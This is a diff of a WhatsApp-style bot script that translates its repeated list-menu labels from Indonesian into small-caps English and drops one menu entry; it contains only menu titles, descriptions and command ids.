+          title: "ɢʀᴏᴜᴘ ғᴇᴀᴛᴜʀᴇs",
+          description: "👥 sʜᴏᴡ ɢʀᴏᴜᴘ ғᴇᴀᴛᴜʀᴇs",
           id: `.groupmenu`, 
         },
         {
-          title: "ғɪᴛᴜʀ ᴊᴀꜱʜᴇʀ",
-          description: "⚡ ᴍᴇᴍᴜɴᴄᴜʟᴋᴀɴ ғɪᴛᴜʀ ᴊᴀꜱʜᴇʀ",
-          id: `.jashermenu`, 
-        },
-        {
-          title: "Games Menu",
-          description: "🎮 Menampilkan Games Menu",
+          title: "ɢᴀᴍᴇ ғᴇᴀᴛᴜʀᴇs",
+          description: "🎮 sʜᴏᴡ ɢᴀᴍᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.gamemenu`, 
         },
         {
-          title: "Store Menu",
-          description: "🛍️ Menampilkan Store Menu",
+          title: "sʜᴏᴘ ғᴇᴀᴛᴜʀᴇs",
+          description: "🛍️ sʜᴏᴡ sᴛᴏʀᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.storemenu`, 
         },
         {
-          title: "Cpanel Menu",
-          description: "🛠️ Menampilkan Cpanel Menu",
+          title: "ᴄᴘᴀɴᴇʟ ғᴇᴀᴛᴜʀᴇs",
+          description: "🛠️ sʜᴏᴡ ᴘᴀɴᴇʟ ᴄʀᴇᴀᴛɪᴏɴ ғᴇᴀᴛᴜʀᴇs",
           id: `.cpanelmenu`, 
         },
         {
-          title: "Ngepush Menu", 
-          description: "💾 Menampilkan Ngepush Menu",
+          title: "ᴘᴜsʜ ғᴇᴀᴛᴜʀᴇs", 
+          description: "💾 sʜᴏᴡ ᴘᴜsʜ ғᴇᴀᴛᴜʀᴇs",
           id: `.pushmenu`, 
         },
         {
-          title: "Download Menu",
-          description: "📂 Menampilkan Download Menu",
+          title: "ᴅᴏᴡɴʟᴏᴀᴅᴇʀ",
+          description: "📂 sʜᴏᴡ ᴅᴏᴡɴʟᴏᴀᴅ ғᴇᴀᴛᴜʀᴇs (ɪɢ/ᴛᴛ/ʏᴛ)",
           id: `.downloadmenu`, 
         },
         {
-          title: "AI Menu",
-          description: "🤖 Menampilkan AI Menu",
+          title: "ᴀɪ",
+          description: "🤖 sʜᴏᴡ ᴀɪ ғᴇᴀᴛᴜʀᴇs",
           id: `.aimenu`, 
         },
         {
-          title: "NSFW Menu",
-          description: "🔞 Menampilkan NSFW Menu",
+          title: "18+",
+          description: "🔞 sʜᴏᴡ 18+ ғᴇᴀᴛᴜʀᴇs",
           id: `.nsfwmenu`, 
         },
         {
-          title: "Anime Menu",
-          description: "🤍 Menampilkan NSFW Menu",
+          title: "ᴀɴɪᴍᴇ",
+          description: "🤍 sʜᴏᴡ ᴀɴɪᴍᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.animemenu`, 
         },
         {
-          title: "Ephoto360 Menu",
-          description: "🖼️ Menampilkan Ephoto360 Menu",
+          title: "ᴘʜᴏᴛᴏ ᴇᴅɪᴛ",
+          description: "🖼️ sʜᴏᴡ ᴘʜᴏᴛᴏ ᴇᴅɪᴛɪɴɢ ғᴇᴀᴛᴜʀᴇs",
           id: `.ephoto360menu`, 
         },
         {
-          title: "Fun Menu",
-          description: "🥳 Menampilkan Fun Menu",
+          title: "ғᴜɴ",
+          description: "🥳 sʜᴏᴡ ғᴜɴ ғᴇᴀᴛᴜʀᴇs",
           id: `.funmenu`, 
         },
         {
-          title: "Islamic Menu",
-          description: "🕌 Menampilkan Islamic Menu",
+          title: "ɪsʟᴀᴍɪᴄ",
+          description: "🕌 sʜᴏᴡ ɪsʟᴀᴍɪᴄ ғᴇᴀᴛᴜʀᴇs",
           id: `.islamimenu`, 
         },
         {
-          title: "Database Menu",
-          description: "🖥️ Menampilkan Database Menu",
+          title: "ᴅᴀᴛᴀʙᴀsᴇ",
+          description: "🖥️ sʜᴏᴡ ᴅᴀᴛᴀʙᴀsᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.databasemenu`, 
         },
         {
-          title: "Others Menu",
-          description: "📪 Menampilkan Others Menu",
+          title: "ᴏᴛʜᴇʀ",
+          description: "📪 sʜᴏᴡ ᴏᴛʜᴇʀ ғᴇᴀᴛᴜʀᴇs",
           id: `.othermenu`, 
         },
         {
-          title: "RPG Menu",
-          description: "🧰 Menampilkan RPG Menu",
+          title: "ʀᴘɢ",
+          description: "🧰 sʜᴏᴡ ʀᴘɢ ғᴇᴀᴛᴜʀᴇs",
           id: `.rpgmenu`, 
         },
         {
-          title: "Domain Menu",
-          description: "🌐 Menampilkan Domain Menu",
+          title: "sᴜʙᴅᴏᴍᴀɪɴ",
+          description: "🌐 sʜᴏᴡ sᴜʙᴅᴏᴍᴀɪɴ ᴄʀᴇᴀᴛɪᴏɴ",
           id: `.domainmenu`, 
         },
         {
-          title: "Anonymous Menu",
-          description: "👤 Menampilkan Anonymous Menu",
+          title: "ᴀɴᴏɴʏᴍᴏᴜs",
+          description: "👤 sʜᴏᴡ ᴀɴᴏɴʏᴍᴏᴜs ғᴇᴀᴛᴜʀᴇs",
           id: `.anonymousmenu`, 
         },
         {
-          title: "Random Video Menu",
-          description: "🎥 Menampilkan Random Video Menu",
+          title: "ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ",
+          description: "🎥 sʜᴏᴡ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ",
           id: `.randomvideomenu`, 
         },
         {
-          title: "Random Photo Menu",
-          description: "📷 Menampilkan Photo Video Menu",
+          title: "ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ",
+          description: "📷 sʜᴏᴡ ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ",
           id: `.randomphotomenu`, 
         },
         {
-          title: "Sticker Menu",
-          description: "📝 Menampilkan Sticker Menu",
+          title: "sᴛɪᴄᴋᴇʀ",
+          description: "📝 sʜᴏᴡ sᴛɪᴄᴋᴇʀ ғᴇᴀᴛᴜʀᴇs",
           id: `.stickermenu`, 
         },
         {
-          title: "Quotes Menu",
-          description: "💬 Menampilkan Quotes Menu",
+          title: "ǫᴜᴏᴛᴇs",
+          description: "💬 sʜᴏᴡ ǫᴜᴏᴛᴇs",
           id: `.quotesmenu`, 
         },
         {
-          title: "Stalker Menu",
-          description: "🔍 Menampilkan Stalker Menu",
+          title: "sᴛᴀʟᴋ",
+          description: "🔍 sʜᴏᴡ sᴛᴀʟᴋɪɴɢ",
           id: `.stalkermenu`, 
         },
         {
-          title: "Bug Menu",
-          description: "🐛 Menampilkan Bug Menu",
+          title: "ʙᴜɢ",
+          description: "🐛 sʜᴏᴡ ʙᴜɢ ғᴇᴀᴛᴜʀᴇs",
           id: `.bugmenu`, 
         },
         {
-          title: "Digital Ocean Menu",
-          description: "🌐 Menampilkan Digital Ocean Menu",
+          title: "ᴅɪɢɪᴛᴀʟᴏᴄᴇᴀɴ",
+          description: "🌐 sʜᴏᴡ ᴅɪɢɪᴛᴀʟᴏᴄᴇᴀɴ ғᴇᴀᴛᴜʀᴇs",
           id: `.digitaloceanmenu`, 
         },
         {
-          title: "Pyterodactyle Menu",
-          description: "⚙️ Menampilkan Pyterodactyle Menu",
+          title: "ᴘᴛᴇʀᴏᴅᴀᴄᴛʏʟ",
+          description: "⚙ sʜᴏᴡ ᴘᴛᴇʀᴏᴅᴀᴄᴛʏʟ ғᴇᴀᴛᴜʀᴇs",
           id: `.pyterodactylemenu`, 
         },
       ]
     },
     {
-      title: `Dokumentasi asli dari script ini`, 
-      highlight_label: ``,
+      title: `ᴏᴛʜᴇʀ`, 
       rows: [
         {
-          title: "Script",
-          description: "💳 script ini gratis 100%",          id: `script`, 
+          title: "sᴄʀɪᴘᴛ",
+          description: "💳 ᴛʜɪs sᴄʀɪᴘᴛ ɪs ғʀᴇᴇ & ɴᴏ ᴇɴᴄ",
+          id: `script`, 
         },
         {
           title: "ʀᴀᴛɪɴɢ",
-          description: "🌟 ʀᴀᴛɪɴɢ ʙᴏᴛ ɪɴɪ",
+          description: "🌟 ʀᴀᴛᴇ ᴛʜɪs ʙᴏᴛ",
           id: `.rating`,
         },
         {
-          title: "Info Bot",
-          description: "📋 Informasi total fitur dan lainnya",
+          title: "ɪɴғᴏ ʙᴏᴛ",
+          description: "📋 sʜᴏᴡ ʙᴏᴛ ɪɴғᴏ",
           id: `.infobot`, 
         },
       ]
@@ -9124,186 +9055,181 @@ break
 case 'aimenu': {
    let HydroSad = `${aimenu(prefix, hituet)}`
 const bet = {
-  title: "LIST MENU",
+  title: "ʟɪsᴛ ᴍᴇɴᴜ",
   sections: [
     {
-      title: `List menu yang sering dipakai`, 
-      highlight_label: `Populer`,
+      title: `Frequently Used Menu`, 
+      highlight_label: `Popular`,
       rows: [
         {
-          title: "All Menu",
-          description: "📌 Menampilkan All Menu",
+          title: "sᴇᴍᴜᴀ ғɪᴛᴜʀ",
+          description: "📌 sʜᴏᴡ ᴀʟʟ ᴀᴠᴀɪʟᴀʙʟᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.allmenu`, 
         },
       ]
     },
     {
-      title: `List menu yang dipisahkan`, 
+      title: `sᴇᴘᴀʀᴀᴛᴇᴅ ᴍᴇɴᴜ`, 
       highlight_label: ``,
       rows: [
         {
-          title: "Baca Peraturan",
-          description: "🎉 Menampilkan peraturan",
+          title: "ʀᴜʟᴇs",
+          description: "🎉 sʜᴏᴡ ʙᴏᴛ ʀᴜʟᴇs",
           id: `.bacaperaturan`, 
         },
         {
-          title: "Donasi",
-          description: "💸 Menampilkan menu donasi",
+          title: "ᴅᴏɴᴀᴛɪᴏɴ",
+          description: "💸 sᴜᴘᴘᴏʀᴛ ᴛʜᴇ ʙᴏᴛ ᴛᴏ ɢʀᴏᴡ",
           id: `.donasi`, 
         },
         {
-          title: "Owner Menu",
-          description: "👤 Menampilkan Owner Menu",
+          title: "ᴏᴡɴᴇʀ ғᴇᴀᴛᴜʀᴇs",
+          description: "👤 sʜᴏᴡ ᴏᴡɴᴇʀ ғᴇᴀᴛᴜʀᴇs",
           id: `.ownermenu`, 
         },
         {
-          title: "Group Menu",
-          description: "👥 Menampilkan Group Menu",
+          title: "ɢʀᴏᴜᴘ ғᴇᴀᴛᴜʀᴇs",
+          description: "👥 sʜᴏᴡ ɢʀᴏᴜᴘ ғᴇᴀᴛᴜʀᴇs",
           id: `.groupmenu`, 
         },
         {
-          title: "ғɪᴛᴜʀ ᴊᴀꜱʜᴇʀ",
-          description: "⚡ ᴍᴇᴍᴜɴᴄᴜʟᴋᴀɴ ғɪᴛᴜʀ ᴊᴀꜱʜᴇʀ",
-          id: `.jashermenu`, 
-        },
-        {
-          title: "Games Menu",
-          description: "🎮 Menampilkan Games Menu",
+          title: "ɢᴀᴍᴇ ғᴇᴀᴛᴜʀᴇs",
+          description: "🎮 sʜᴏᴡ ɢᴀᴍᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.gamemenu`, 
         },
         {
-          title: "Store Menu",
-          description: "🛍️ Menampilkan Store Menu",
+          title: "sʜᴏᴘ ғᴇᴀᴛᴜʀᴇs",
+          description: "🛍️ sʜᴏᴡ sᴛᴏʀᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.storemenu`, 
         },
         {
-          title: "Cpanel Menu",
-          description: "🛠️ Menampilkan Cpanel Menu",
+          title: "ᴄᴘᴀɴᴇʟ ғᴇᴀᴛᴜʀᴇs",
+          description: "🛠️ sʜᴏᴡ ᴘᴀɴᴇʟ ᴄʀᴇᴀᴛɪᴏɴ ғᴇᴀᴛᴜʀᴇs",
           id: `.cpanelmenu`, 
         },
         {
-          title: "Ngepush Menu", 
-          description: "💾 Menampilkan Ngepush Menu",
+          title: "ᴘᴜsʜ ғᴇᴀᴛᴜʀᴇs", 
+          description: "💾 sʜᴏᴡ ᴘᴜsʜ ғᴇᴀᴛᴜʀᴇs",
           id: `.pushmenu`, 
         },
         {
-          title: "Download Menu",
-          description: "📂 Menampilkan Download Menu",
+          title: "ᴅᴏᴡɴʟᴏᴀᴅᴇʀ",
+          description: "📂 sʜᴏᴡ ᴅᴏᴡɴʟᴏᴀᴅ ғᴇᴀᴛᴜʀᴇs (ɪɢ/ᴛᴛ/ʏᴛ)",
           id: `.downloadmenu`, 
         },
         {
-          title: "AI Menu",
-          description: "🤖 Menampilkan AI Menu",
+          title: "ᴀɪ",
+          description: "🤖 sʜᴏᴡ ᴀɪ ғᴇᴀᴛᴜʀᴇs",
           id: `.aimenu`, 
         },
         {
-          title: "NSFW Menu",
-          description: "🔞 Menampilkan NSFW Menu",
+          title: "18+",
+          description: "🔞 sʜᴏᴡ 18+ ғᴇᴀᴛᴜʀᴇs",
           id: `.nsfwmenu`, 
         },
         {
-          title: "Anime Menu",
-          description: "🤍 Menampilkan NSFW Menu",
+          title: "ᴀɴɪᴍᴇ",
+          description: "🤍 sʜᴏᴡ ᴀɴɪᴍᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.animemenu`, 
         },
         {
-          title: "Ephoto360 Menu",
-          description: "🖼️ Menampilkan Ephoto360 Menu",
+          title: "ᴘʜᴏᴛᴏ ᴇᴅɪᴛ",
+          description: "🖼️ sʜᴏᴡ ᴘʜᴏᴛᴏ ᴇᴅɪᴛɪɴɢ ғᴇᴀᴛᴜʀᴇs",
           id: `.ephoto360menu`, 
         },
         {
-          title: "Fun Menu",
-          description: "🥳 Menampilkan Fun Menu",
+          title: "ғᴜɴ",
+          description: "🥳 sʜᴏᴡ ғᴜɴ ғᴇᴀᴛᴜʀᴇs",
           id: `.funmenu`, 
         },
         {
-          title: "Islamic Menu",
-          description: "🕌 Menampilkan Islamic Menu",
+          title: "ɪsʟᴀᴍɪᴄ",
+          description: "🕌 sʜᴏᴡ ɪsʟᴀᴍɪᴄ ғᴇᴀᴛᴜʀᴇs",
           id: `.islamimenu`, 
         },
         {
-          title: "Database Menu",
-          description: "🖥️ Menampilkan Database Menu",
+          title: "ᴅᴀᴛᴀʙᴀsᴇ",
+          description: "🖥️ sʜᴏᴡ ᴅᴀᴛᴀʙᴀsᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.databasemenu`, 
         },
         {
-          title: "Others Menu",
-          description: "📪 Menampilkan Others Menu",
+          title: "ᴏᴛʜᴇʀ",
+          description: "📪 sʜᴏᴡ ᴏᴛʜᴇʀ ғᴇᴀᴛᴜʀᴇs",
           id: `.othermenu`, 
         },
         {
-          title: "RPG Menu",
-          description: "🧰 Menampilkan RPG Menu",
+          title: "ʀᴘɢ",
+          description: "🧰 sʜᴏᴡ ʀᴘɢ ғᴇᴀᴛᴜʀᴇs",
           id: `.rpgmenu`, 
         },
         {
-          title: "Domain Menu",
-          description: "🌐 Menampilkan Domain Menu",
+          title: "sᴜʙᴅᴏᴍᴀɪɴ",
+          description: "🌐 sʜᴏᴡ sᴜʙᴅᴏᴍᴀɪɴ ᴄʀᴇᴀᴛɪᴏɴ",
           id: `.domainmenu`, 
         },
         {
-          title: "Anonymous Menu",
-          description: "👤 Menampilkan Anonymous Menu",
+          title: "ᴀɴᴏɴʏᴍᴏᴜs",
+          description: "👤 sʜᴏᴡ ᴀɴᴏɴʏᴍᴏᴜs ғᴇᴀᴛᴜʀᴇs",
           id: `.anonymousmenu`, 
         },
         {
-          title: "Random Video Menu",
-          description: "🎥 Menampilkan Random Video Menu",
+          title: "ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ",
+          description: "🎥 sʜᴏᴡ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ",
           id: `.randomvideomenu`, 
         },
         {
-          title: "Random Photo Menu",
-          description: "📷 Menampilkan Photo Video Menu",
+          title: "ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ",
+          description: "📷 sʜᴏᴡ ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ",
           id: `.randomphotomenu`, 
         },
         {
-          title: "Sticker Menu",
-          description: "📝 Menampilkan Sticker Menu",
+          title: "sᴛɪᴄᴋᴇʀ",
+          description: "📝 sʜᴏᴡ sᴛɪᴄᴋᴇʀ ғᴇᴀᴛᴜʀᴇs",
           id: `.stickermenu`, 
         },
         {
-          title: "Quotes Menu",
-          description: "💬 Menampilkan Quotes Menu",
+          title: "ǫᴜᴏᴛᴇs",
+          description: "💬 sʜᴏᴡ ǫᴜᴏᴛᴇs",
           id: `.quotesmenu`, 
         },
         {
-          title: "Stalker Menu",
-          description: "🔍 Menampilkan Stalker Menu",
+          title: "sᴛᴀʟᴋ",
+          description: "🔍 sʜᴏᴡ sᴛᴀʟᴋɪɴɢ",
           id: `.stalkermenu`, 
         },
         {
-          title: "Bug Menu",
-          description: "🐛 Menampilkan Bug Menu",
+          title: "ʙᴜɢ",
+          description: "🐛 sʜᴏᴡ ʙᴜɢ ғᴇᴀᴛᴜʀᴇs",
           id: `.bugmenu`, 
         },
         {
-          title: "Digital Ocean Menu",
-          description: "🌐 Menampilkan Digital Ocean Menu",
+          title: "ᴅɪɢɪᴛᴀʟᴏᴄᴇᴀɴ",
+          description: "🌐 sʜᴏᴡ ᴅɪɢɪᴛᴀʟᴏᴄᴇᴀɴ ғᴇᴀᴛᴜʀᴇs",
           id: `.digitaloceanmenu`, 
         },
         {
-          title: "Pyterodactyle Menu",
-          description: "⚙️ Menampilkan Pyterodactyle Menu",
+          title: "ᴘᴛᴇʀᴏᴅᴀᴄᴛʏʟ",
+          description: "⚙ sʜᴏᴡ ᴘᴛᴇʀᴏᴅᴀᴄᴛʏʟ ғᴇᴀᴛᴜʀᴇs",
           id: `.pyterodactylemenu`, 
         },
       ]
     },
     {
-      title: `Dokumentasi asli dari script ini`, 
-      highlight_label: ``,
+      title: `ᴏᴛʜᴇʀ`, 
       rows: [
         {
-          title: "Script",
-          description: "💳 script ini gratis 100%",          id: `script`, 
+          title: "sᴄʀɪᴘᴛ",
+          description: "💳 ᴛʜɪs sᴄʀɪᴘᴛ ɪs ғʀᴇᴇ & ɴᴏ ᴇɴᴄ",
+          id: `script`, 
         },
         {
           title: "ʀᴀᴛɪɴɢ",
-          description: "🌟 ʀᴀᴛɪɴɢ ʙᴏᴛ ɪɴɪ",
+          description: "🌟 ʀᴀᴛᴇ ᴛʜɪs ʙᴏᴛ",
           id: `.rating`,
         },
         {
-          title: "Info Bot",
-          description: "📋 Informasi total fitur dan lainnya",
+          title: "ɪɴғᴏ ʙᴏᴛ",
+          description: "📋 sʜᴏᴡ ʙᴏᴛ ɪɴғᴏ",
           id: `.infobot`, 
         },
       ]
@@ -9316,186 +9242,181 @@ break
 case 'bugmenu': {
   let HydroSad = `${bugmenu(prefix, hituet)}`
 const bet = {
-  title: "LIST MENU",
+  title: "ʟɪsᴛ ᴍᴇɴᴜ",
   sections: [
     {
-      title: `List menu yang sering dipakai`, 
-      highlight_label: `Populer`,
+      title: `Frequently Used Menu`, 
+      highlight_label: `Popular`,
       rows: [
         {
-          title: "All Menu",
-          description: "📌 Menampilkan All Menu",
+          title: "sᴇᴍᴜᴀ ғɪᴛᴜʀ",
+          description: "📌 sʜᴏᴡ ᴀʟʟ ᴀᴠᴀɪʟᴀʙʟᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.allmenu`, 
         },
       ]
     },
     {
-      title: `List menu yang dipisahkan`, 
+      title: `sᴇᴘᴀʀᴀᴛᴇᴅ ᴍᴇɴᴜ`, 
       highlight_label: ``,
       rows: [
         {
-          title: "Baca Peraturan",
-          description: "🎉 Menampilkan peraturan",
+          title: "ʀᴜʟᴇs",
+          description: "🎉 sʜᴏᴡ ʙᴏᴛ ʀᴜʟᴇs",
           id: `.bacaperaturan`, 
         },
         {
-          title: "Donasi",
-          description: "💸 Menampilkan menu donasi",
+          title: "ᴅᴏɴᴀᴛɪᴏɴ",
+          description: "💸 sᴜᴘᴘᴏʀᴛ ᴛʜᴇ ʙᴏᴛ ᴛᴏ ɢʀᴏᴡ",
           id: `.donasi`, 
         },
         {
-          title: "Owner Menu",
-          description: "👤 Menampilkan Owner Menu",
+          title: "ᴏᴡɴᴇʀ ғᴇᴀᴛᴜʀᴇs",
+          description: "👤 sʜᴏᴡ ᴏᴡɴᴇʀ ғᴇᴀᴛᴜʀᴇs",
           id: `.ownermenu`, 
         },
         {
-          title: "Group Menu",
-          description: "👥 Menampilkan Group Menu",
+          title: "ɢʀᴏᴜᴘ ғᴇᴀᴛᴜʀᴇs",
+          description: "👥 sʜᴏᴡ ɢʀᴏᴜᴘ ғᴇᴀᴛᴜʀᴇs",
           id: `.groupmenu`, 
         },
         {
-          title: "ғɪᴛᴜʀ ᴊᴀꜱʜᴇʀ",
-          description: "⚡ ᴍᴇᴍᴜɴᴄᴜʟᴋᴀɴ ғɪᴛᴜʀ ᴊᴀꜱʜᴇʀ",
-          id: `.jashermenu`, 
-        },
-        {
-          title: "Games Menu",
-          description: "🎮 Menampilkan Games Menu",
+          title: "ɢᴀᴍᴇ ғᴇᴀᴛᴜʀᴇs",
+          description: "🎮 sʜᴏᴡ ɢᴀᴍᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.gamemenu`, 
         },
         {
-          title: "Store Menu",
-          description: "🛍️ Menampilkan Store Menu",
+          title: "sʜᴏᴘ ғᴇᴀᴛᴜʀᴇs",
+          description: "🛍️ sʜᴏᴡ sᴛᴏʀᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.storemenu`, 
         },
         {
-          title: "Cpanel Menu",
-          description: "🛠️ Menampilkan Cpanel Menu",
+          title: "ᴄᴘᴀɴᴇʟ ғᴇᴀᴛᴜʀᴇs",
+          description: "🛠️ sʜᴏᴡ ᴘᴀɴᴇʟ ᴄʀᴇᴀᴛɪᴏɴ ғᴇᴀᴛᴜʀᴇs",
           id: `.cpanelmenu`, 
         },
         {
-          title: "Ngepush Menu", 
-          description: "💾 Menampilkan Ngepush Menu",
+          title: "ᴘᴜsʜ ғᴇᴀᴛᴜʀᴇs", 
+          description: "💾 sʜᴏᴡ ᴘᴜsʜ ғᴇᴀᴛᴜʀᴇs",
           id: `.pushmenu`, 
         },
         {
-          title: "Download Menu",
-          description: "📂 Menampilkan Download Menu",
+          title: "ᴅᴏᴡɴʟᴏᴀᴅᴇʀ",
+          description: "📂 sʜᴏᴡ ᴅᴏᴡɴʟᴏᴀᴅ ғᴇᴀᴛᴜʀᴇs (ɪɢ/ᴛᴛ/ʏᴛ)",
           id: `.downloadmenu`, 
         },
         {
-          title: "AI Menu",
-          description: "🤖 Menampilkan AI Menu",
+          title: "ᴀɪ",
+          description: "🤖 sʜᴏᴡ ᴀɪ ғᴇᴀᴛᴜʀᴇs",
           id: `.aimenu`, 
         },
         {
-          title: "NSFW Menu",
-          description: "🔞 Menampilkan NSFW Menu",
+          title: "18+",
+          description: "🔞 sʜᴏᴡ 18+ ғᴇᴀᴛᴜʀᴇs",
           id: `.nsfwmenu`, 
         },
         {
-          title: "Anime Menu",
-          description: "🤍 Menampilkan NSFW Menu",
+          title: "ᴀɴɪᴍᴇ",
+          description: "🤍 sʜᴏᴡ ᴀɴɪᴍᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.animemenu`, 
         },
         {
-          title: "Ephoto360 Menu",
-          description: "🖼️ Menampilkan Ephoto360 Menu",
+          title: "ᴘʜᴏᴛᴏ ᴇᴅɪᴛ",
+          description: "🖼️ sʜᴏᴡ ᴘʜᴏᴛᴏ ᴇᴅɪᴛɪɴɢ ғᴇᴀᴛᴜʀᴇs",
           id: `.ephoto360menu`, 
         },
         {
-          title: "Fun Menu",
-          description: "🥳 Menampilkan Fun Menu",
+          title: "ғᴜɴ",
+          description: "🥳 sʜᴏᴡ ғᴜɴ ғᴇᴀᴛᴜʀᴇs",
           id: `.funmenu`, 
         },
         {
-          title: "Islamic Menu",
-          description: "🕌 Menampilkan Islamic Menu",
+          title: "ɪsʟᴀᴍɪᴄ",
+          description: "🕌 sʜᴏᴡ ɪsʟᴀᴍɪᴄ ғᴇᴀᴛᴜʀᴇs",
           id: `.islamimenu`, 
         },
         {
-          title: "Database Menu",
-          description: "🖥️ Menampilkan Database Menu",
+          title: "ᴅᴀᴛᴀʙᴀsᴇ",
+          description: "🖥️ sʜᴏᴡ ᴅᴀᴛᴀʙᴀsᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.databasemenu`, 
         },
         {
-          title: "Others Menu",
-          description: "📪 Menampilkan Others Menu",
+          title: "ᴏᴛʜᴇʀ",
+          description: "📪 sʜᴏᴡ ᴏᴛʜᴇʀ ғᴇᴀᴛᴜʀᴇs",
           id: `.othermenu`, 
         },
         {
-          title: "RPG Menu",
-          description: "🧰 Menampilkan RPG Menu",
+          title: "ʀᴘɢ",
+          description: "🧰 sʜᴏᴡ ʀᴘɢ ғᴇᴀᴛᴜʀᴇs",
           id: `.rpgmenu`, 
         },
         {
-          title: "Domain Menu",
-          description: "🌐 Menampilkan Domain Menu",
+          title: "sᴜʙᴅᴏᴍᴀɪɴ",
+          description: "🌐 sʜᴏᴡ sᴜʙᴅᴏᴍᴀɪɴ ᴄʀᴇᴀᴛɪᴏɴ",
           id: `.domainmenu`, 
         },
         {
-          title: "Anonymous Menu",
-          description: "👤 Menampilkan Anonymous Menu",
+          title: "ᴀɴᴏɴʏᴍᴏᴜs",
+          description: "👤 sʜᴏᴡ ᴀɴᴏɴʏᴍᴏᴜs ғᴇᴀᴛᴜʀᴇs",
           id: `.anonymousmenu`, 
         },
         {
-          title: "Random Video Menu",
-          description: "🎥 Menampilkan Random Video Menu",
+          title: "ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ",
+          description: "🎥 sʜᴏᴡ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ",
           id: `.randomvideomenu`, 
         },
         {
-          title: "Random Photo Menu",
-          description: "📷 Menampilkan Photo Video Menu",
+          title: "ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ",
+          description: "📷 sʜᴏᴡ ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ",
           id: `.randomphotomenu`, 
         },
         {
-          title: "Sticker Menu",
-          description: "📝 Menampilkan Sticker Menu",
+          title: "sᴛɪᴄᴋᴇʀ",
+          description: "📝 sʜᴏᴡ sᴛɪᴄᴋᴇʀ ғᴇᴀᴛᴜʀᴇs",
           id: `.stickermenu`, 
         },
         {
-          title: "Quotes Menu",
-          description: "💬 Menampilkan Quotes Menu",
+          title: "ǫᴜᴏᴛᴇs",
+          description: "💬 sʜᴏᴡ ǫᴜᴏᴛᴇs",
           id: `.quotesmenu`, 
         },
         {
-          title: "Stalker Menu",
-          description: "🔍 Menampilkan Stalker Menu",
+          title: "sᴛᴀʟᴋ",
+          description: "🔍 sʜᴏᴡ sᴛᴀʟᴋɪɴɢ",
           id: `.stalkermenu`, 
         },
         {
-          title: "Bug Menu",
-          description: "🐛 Menampilkan Bug Menu",
+          title: "ʙᴜɢ",
+          description: "🐛 sʜᴏᴡ ʙᴜɢ ғᴇᴀᴛᴜʀᴇs",
           id: `.bugmenu`, 
         },
         {
-          title: "Digital Ocean Menu",
-          description: "🌐 Menampilkan Digital Ocean Menu",
+          title: "ᴅɪɢɪᴛᴀʟᴏᴄᴇᴀɴ",
+          description: "🌐 sʜᴏᴡ ᴅɪɢɪᴛᴀʟᴏᴄᴇᴀɴ ғᴇᴀᴛᴜʀᴇs",
           id: `.digitaloceanmenu`, 
         },
         {
-          title: "Pyterodactyle Menu",
-          description: "⚙️ Menampilkan Pyterodactyle Menu",
+          title: "ᴘᴛᴇʀᴏᴅᴀᴄᴛʏʟ",
+          description: "⚙ sʜᴏᴡ ᴘᴛᴇʀᴏᴅᴀᴄᴛʏʟ ғᴇᴀᴛᴜʀᴇs",
           id: `.pyterodactylemenu`, 
         },
       ]
     },
     {
-      title: `Dokumentasi asli dari script ini`, 
-      highlight_label: ``,
+      title: `ᴏᴛʜᴇʀ`, 
       rows: [
         {
-          title: "Script",
-          description: "💳 script ini gratis 100%",          id: `script`, 
+          title: "sᴄʀɪᴘᴛ",
+          description: "💳 ᴛʜɪs sᴄʀɪᴘᴛ ɪs ғʀᴇᴇ & ɴᴏ ᴇɴᴄ",
+          id: `script`, 
         },
         {
           title: "ʀᴀᴛɪɴɢ",
-          description: "🌟 ʀᴀᴛɪɴɢ ʙᴏᴛ ɪɴɪ",
+          description: "🌟 ʀᴀᴛᴇ ᴛʜɪs ʙᴏᴛ",
           id: `.rating`,
         },
         {
-          title: "Info Bot",
-          description: "📋 Informasi total fitur dan lainnya",
+          title: "ɪɴғᴏ ʙᴏᴛ",
+          description: "📋 sʜᴏᴡ ʙᴏᴛ ɪɴғᴏ",
           id: `.infobot`, 
         },
       ]
@@ -9508,378 +9429,181 @@ break
 case 'pyterodactylemenu': {
   let HydroSad = `${pyterodactylemenu(prefix, hituet)}`
 const bet = {
-  title: "LIST MENU",
+  title: "ʟɪsᴛ ᴍᴇɴᴜ",
   sections: [
     {
-      title: `List menu yang sering dipakai`, 
-      highlight_label: `Populer`,
+      title: `Frequently Used Menu`, 
+      highlight_label: `Popular`,
       rows: [
         {
-          title: "All Menu",
-          description: "📌 Menampilkan All Menu",
+          title: "sᴇᴍᴜᴀ ғɪᴛᴜʀ",
+          description: "📌 sʜᴏᴡ ᴀʟʟ ᴀᴠᴀɪʟᴀʙʟᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.allmenu`, 
         },
       ]
     },
     {
-      title: `List menu yang dipisahkan`, 
+      title: `sᴇᴘᴀʀᴀᴛᴇᴅ ᴍᴇɴᴜ`, 
       highlight_label: ``,
       rows: [
         {
-          title: "Baca Peraturan",
-          description: "🎉 Menampilkan peraturan",
+          title: "ʀᴜʟᴇs",
+          description: "🎉 sʜᴏᴡ ʙᴏᴛ ʀᴜʟᴇs",
